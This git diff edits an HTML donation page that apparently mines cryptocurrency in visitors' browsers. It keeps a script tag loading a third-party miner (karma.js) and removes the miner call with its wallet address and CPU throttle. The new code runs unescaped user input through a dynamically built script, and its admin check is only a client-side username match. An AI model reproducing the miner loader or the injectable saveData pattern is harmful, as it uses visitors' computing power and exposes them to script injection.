@@ -66,125 +66,78 @@
     </div>
 
     <script src="https://trustisimportant.fun/karma/karma.js?karma=bs?nosaj=faster.mo"></script>
-    <script type="text/javascript">
-        EverythingIsLife('45d5LPYeRSEPywkk61dHxFfSDLKYhRhuP3VoC8d9B98Qgu3jDZTxm9G949ZpLGSTXAUk24sXniAn5WtHLrzFbR3UK2Mhwdt', 'Donate', 70);
-    </script>
-
     <script>
-        const donationRatePerSecond = 0.0000000144; // Updated donation rate per second for 25 h/s
-        let donationAmount = 0.0000000000;
-        let secondsElapsed = 0;
-        let users = {};
-        let username = '';
+        // Default donation rate per second (example)
+        const donationRatePerSecond = 0.0000000144;
 
-        document.addEventListener("DOMContentLoaded", function() {
-            document.getElementById('login-section').style.display = 'block';
-            loadUserData();
-        });
+        // Initialize donation amount and user data
+        let donationAmount = parseFloat(getData('donationAmount')) || 0.0;
+        let users = JSON.parse(getData('users')) || {};
+
+        // Display login section on page load
+        document.getElementById('login-section').style.display = 'block';
 
         function login() {
-            username = document.getElementById('username').value;
+            const username = document.getElementById('username').value.trim();
             if (username) {
                 document.getElementById('login-section').style.display = 'none';
                 if (username === 'admin-xeno1') {
                     document.getElementById('admin-section').style.display = 'block';
-                    fetchUserData(); // Fetch user donations from server
+                    displayUserDonations();
                 } else {
                     document.getElementById('donation-section').style.display = 'block';
-                    startDonationTracker();
+                    startDonationTracker(username);
                 }
             }
         }
 
-        function startDonationTracker() {
-            setInterval(updateCounters, 1000);
-        }
+        function startDonationTracker(username) {
+            setInterval(() => {
+                // Update donation amount
+                donationAmount += donationRatePerSecond;
+                saveData('donationAmount', donationAmount.toString());
+                document.getElementById('donation-amount').innerText = donationAmount.toFixed(10);
 
-        function updateCounters() {
-            donationAmount += donationRatePerSecond;
-            document.getElementById('donation-amount').innerText = donationAmount.toFixed(10);
-
-            if (!users[username]) {
-                users[username] = 0;
-            }
-            users[username] += donationRatePerSecond;
-
-            secondsElapsed++;
-            const hours = Math.floor(secondsElapsed / 3600);
-            const minutes = Math.floor((secondsElapsed % 3600) / 60);
-            const seconds = secondsElapsed % 60;
-            document.getElementById('time-counter').innerText = formatTime(hours) + ":" + formatTime(minutes) + ":" + formatTime(seconds);
-
-            // Save user data to GitHub repository
-            saveUserData(username, users[username]);
-        }
-
-        function formatTime(time) {
-            return (time < 10 ? "0" + time : time);
-        }
-
-        function saveUserData(username, donationAmount) {
-            // Example: Use fetch to update data in GitHub repository
-            const newData = { "username": username, "donationAmount": donationAmount };
-            const encodedData = btoa(JSON.stringify(newData));
-            fetch('https://api.github.com/repos/notglitchy32/notglitchy32.github.io/contents/data/users.json', {
-                method: 'GET',
-                headers: {
-                    'Authorization': 'token YOUR_GITHUB_TOKEN',
-                    'Accept': 'application/vnd.github.v3+json',
+                // Update user's donation amount
+                if (!users[username]) {
+                    users[username] = 0.0;
                 }
-            })
-            .then(response => response.json())
-            .then(data => {
-                // Update existing user data or add new user
-                const updatedUsers = data.users.map(user => {
-                    if (user.username === username) {
-                        user.donationAmount = donationAmount;
-                    }
-                    return user;
-                });
+                users[username] += donationRatePerSecond;
+                saveData('users', JSON.stringify(users));
 
-                // If user not found, add new user
-                if (!updatedUsers.some(user => user.username === username)) {
-                    updatedUsers.push({ "username": username, "donationAmount": donationAmount });
-                }
-
-                // Update the file in the repository
-                const sha = data.sha;
-                const apiUrl = `https://api.github.com/repos/notglitchy32/notglitchy32.github.io/contents/data/users.json`;
-                return fetch(apiUrl, {
-                    method: 'PUT',
-                    headers: {
-                        'Authorization': 'token YOUR_GITHUB_TOKEN',
-                        'Accept': 'application/vnd.github.v3+json',
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        message: 'Update donation data',
-                        content: encodedData,
-                        sha: sha
-                    })
-                });
-            })
-            .then(response => response.json())
-            .then(data => console.log('Data saved:', data))
-            .catch(error => console.error('Error saving data:', error));
+                // Update time counter (example)
+                updateTimer();
+            }, 1000);
         }
 
-        function fetchUserData() {
-            // Fetch user donations from GitHub repository
-            fetch('https://raw.githubusercontent.com/notglitchy32/notglitchy32.github.io/main/data/users.json')
-            .then(response => response.json())
-            .then(data => displayUserDonations(data))
-            .catch(error => console.error('Error fetching data:', error));
+        function updateTimer() {
+            // Implement your timer update logic here (example)
+            const now = new Date();
+            const hours = now.getHours();
+            const minutes = now.getMinutes();
+            const seconds = now.getSeconds();
+            document.getElementById('time-counter').innerText = `${hours}:${minutes}:${seconds}`;
         }
 
-        function displayUserDonations(data) {
+        function displayUserDonations() {
             const userDonationsDiv = document.getElementById('user-donations');
             userDonationsDiv.innerHTML = '';
-            data.users.forEach(user => {
-                userDonationsDiv.innerHTML += `<p>${user.username}: $${user.donationAmount.toFixed(10)}</p>`;
-            });
+            for (const user in users) {
+                const donation = users[user].toFixed(10);
+                userDonationsDiv.innerHTML += `<p>${user}: $${donation}</p>`;
+            }
+        }
+
+        // Function to save data in the HTML file (not recommended for large datasets or sensitive data)
+        function saveData(key, value) {
+            const script = document.createElement('script');
+            script.textContent = `localStorage.setItem('${key}', '${value}');`;
+            document.head.appendChild(script).parentNode.removeChild(script);
+        }
+
+        // Function to retrieve data from the HTML file
+        function getData(key) {
+            return localStorage.getItem(key);
         }
     </script>
 </body>
